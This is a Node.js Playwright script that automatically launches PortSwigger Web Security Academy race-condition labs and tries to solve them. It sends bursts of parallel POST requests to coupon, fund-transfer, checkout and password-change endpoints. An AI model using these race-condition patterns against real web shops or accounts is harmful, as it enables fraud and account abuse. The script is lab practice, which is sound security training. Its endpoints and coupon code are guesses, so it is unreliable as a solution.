const { chromium } = require('playwright');

const EMAIL = process.env.PORTSWIGGER_EMAIL;
const PASSWORD = process.env.PORTSWIGGER_PASSWORD;

if (!EMAIL || !PASSWORD) {
  console.error("Set PORTSWIGGER_EMAIL and PORTSWIGGER_PASSWORD env vars");
  process.exit(1);
}

// Race condition lab numbers and titles (5 labs)
const RACE_LABS = [
  { num: 1, title: 'Limit overrun via race condition' },
  { num: 2, title: 'Limit overrun 2' },
  { num: 3, title: 'Multi-endpoint race conditions' },
  { num: 4, title: 'Single-endpoint race conditions' },
  { num: 5, title: 'Hidden multi-endpoint race conditions' },
];

async function solveRaceLab(browser, labNum, labTitle) {
  const ctx = await browser.newContext({ viewport: { width: 1280, height: 900 } });
  const page = await ctx.newPage();
  
  try {
    console.log(`\n[race-conditions#${labNum}] ${labTitle}`);
    
    // Login
    await page.goto('https://portswigger.net/users', { waitUntil: 'networkidle', timeout: 30000 });
    await page.fill('#EmailAddress', EMAIL);
    await page.fill('#Password', PASSWORD);
    await Promise.all([
      page.waitForNavigation({ timeout: 15000 }).catch(() => {}),
      page.click('#Login'),
    ]);
    await page.waitForTimeout(2000);
    
    // Find lab
    await page.goto('https://portswigger.net/web-security/all-labs', { waitUntil: 'networkidle', timeout: 30000 });
    await page.waitForTimeout(3000);
    
    const labLink = await page.evaluate(({ topic, num }) => {
      const links = [...document.querySelectorAll('.widgetcontainer-lab-link')];
      const topicLinks = links.filter(el => {
        const a = el.querySelector('a');
        return a?.getAttribute('href')?.includes(`/web-security/race-conditions/`);
      });
      const target = topicLinks[num - 1];
      if (target?.className.includes('is-solved')) return 'SOLVED';
      return target?.querySelector('a')?.getAttribute('href') || null;
    }, { topic: 'race-conditions', num: labNum });
    
    if (labLink === 'SOLVED') {
      console.log('  Already solved');
      await ctx.close();
      return true;
    }
    if (!labLink) {
      console.log('  Lab not found');
      await ctx.close();
      return false;
    }
    
    // Launch lab
    await page.goto('https://portswigger.net' + labLink, { waitUntil: 'networkidle', timeout: 30000 });
    const launchLink = await page.$('a[href*="labs/launch"]');
    if (!launchLink) { console.log('  No launch link'); await ctx.close(); return false; }
    
    await page.goto('https://portswigger.net' + (await launchLink.getAttribute('href')), {
      waitUntil: 'domcontentloaded', timeout: 60000,
    });
    await page.waitForTimeout(45000);
    
    const labUrl = page.url();
    if (!labUrl.includes('web-security-academy.net')) {
      console.log('  Lab did not load');
      await ctx.close();
      return false;
    }
    
    const base = new URL(labUrl).origin;
    console.log(`  Lab URL: ${base}`);
    
    // Race condition exploit - send multiple parallel requests
    // Try to find coupon/transfer/vote endpoints
    await page.goto(`${base}/`, { waitUntil: 'networkidle', timeout: 30000 });
    
    // Look for common race condition patterns
    const html = await page.content();
    
    // Try to login as wiener if login page
    const loginForm = await page.$('form[action*="login"]');
    if (loginForm) {
      await page.fill('input[name="username"]', 'wiener');
      await page.fill('input[name="password"]', 'peter');
      await Promise.all([
        page.waitForNavigation({ timeout: 15000 }).catch(() => {}),
        page.click('button[type="submit"]'),
      ]);
      await page.waitForTimeout(2000);
    }
    
    // Look for coupon input
    const couponInput = await page.$('input[name*="coupon"]');
    if (couponInput) {
      console.log('  Found coupon input, trying race condition...');
      const couponCode = 'SIGNUP30'; // Common coupon
      
      // Try to find the apply coupon endpoint
      const applyUrl = `${base}/cart/coupon`;
      
      // Send 20 parallel requests
      const requests = [];
      for (let i = 0; i < 20; i++) {
        requests.push(
          page.evaluate(({ url, code }) => {
            return fetch(url, {
              method: 'POST',
              headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
              body: `coupon=${code}`,
            }).then(r => r.text()).catch(e => e.message);
          }, { url: applyUrl, code: couponCode })
        );
      }
      
      await Promise.all(requests);
      await page.waitForTimeout(3000);
      
      // Check if solved
      await page.goto(base, { waitUntil: 'domcontentloaded', timeout: 15000 });
      const body = await page.textContent('body').catch(() => '');
      if (body.toLowerCase().includes('congratulations')) {
        console.log('  SOLVED!');
        await ctx.close();
        return true;
      }
    }
    
    // Look for transfer/withdraw forms
    const transferForm = await page.$('form[action*="transfer"]');
    if (transferForm) {
      console.log('  Found transfer form, trying race condition...');
      const transferUrl = `${base}/my-account/transfer`;
      
      const requests = [];
      for (let i = 0; i < 10; i++) {
        requests.push(
          page.evaluate(({ url }) => {
            return fetch(url, {
              method: 'POST',
              headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
              body: 'account=admin&amount=100',
            }).then(r => r.text()).catch(e => e.message);
          }, { url: transferUrl })
        );
      }
      
      await Promise.all(requests);
      await page.waitForTimeout(3000);
      
      await page.goto(base, { waitUntil: 'domcontentloaded', timeout: 15000 });
      const body = await page.textContent('body').catch(() => '');
      if (body.toLowerCase().includes('congratulations')) {
        console.log('  SOLVED!');
        await ctx.close();
        return true;
      }
    }
    
    // Look for gift card / store credit
    const giftCardForm = await page.$('form[action*="gift-card"]');
    if (giftCardForm) {
      console.log('  Found gift card form, trying race condition...');
      const giftUrl = `${base}/cart/checkout`;
      
      const requests = [];
      for (let i = 0; i < 15; i++) {
        requests.push(
          page.evaluate(({ url }) => {
            return fetch(url, {
              method: 'POST',
              headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
              body: 'amount=10',
            }).then(r => r.text()).catch(e => e.message);
          }, { url: giftUrl })
        );
      }
      
      await Promise.all(requests);
      await page.waitForTimeout(3000);
      
      await page.goto(base, { waitUntil: 'domcontentloaded', timeout: 15000 });
      const body = await page.textContent('body').catch(() => '');
      if (body.toLowerCase().includes('congratulations')) {
        console.log('  SOLVED!');
        await ctx.close();
        return true;
      }
    }
    
    // Generic race - try password change race
    const passwordForm = await page.$('form[action*="password"]');
    if (passwordForm) {
      console.log('  Found password form, trying race condition...');
      const passUrl = `${base}/my-account/change-password`;
      
      const requests = [];
      for (let i = 0; i < 10; i++) {
        requests.push(
          page.evaluate(({ url, idx }) => {
            return fetch(url, {
              method: 'POST',
              headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
              body: `password=${idx}&new-password=password&confirm-password=password`,
            }).then(r => r.text()).catch(e => e.message);
          }, { url: passUrl, idx: i })
        );
      }
      
      await Promise.all(requests);
      await page.waitForTimeout(3000);
      
      await page.goto(base, { waitUntil: 'domcontentloaded', timeout: 15000 });
      const body = await page.textContent('body').catch(() => '');
      if (body.toLowerCase().includes('congratulations')) {
        console.log('  SOLVED!');
        await ctx.close();
        return true;
      }
    }
    
    console.log('  Not solved');
    await ctx.close();
    return false;
  } catch (e) {
    console.log(`  Error: ${e.message}`);
    await ctx.close();
    return false;
  }
}

async function main() {
  console.log('\nRace Conditions Solver\n');
  const browser = await chromium.launch({ headless: true, args: ['--no-sandbox'] });
  
  let solved = 0, failed = 0;
  for (const lab of RACE_LABS) {
    const result = await solveRaceLab(browser, lab.num, lab.title);
    if (result) solved++;
    else failed++;
    await new Promise(r => setTimeout(r, 5000));
  }
  
  console.log(`\nResult: ${solved} solved, ${failed} failed`);
  await browser.close();
}

main().catch(e => { console.error(e); process.exit(1); });
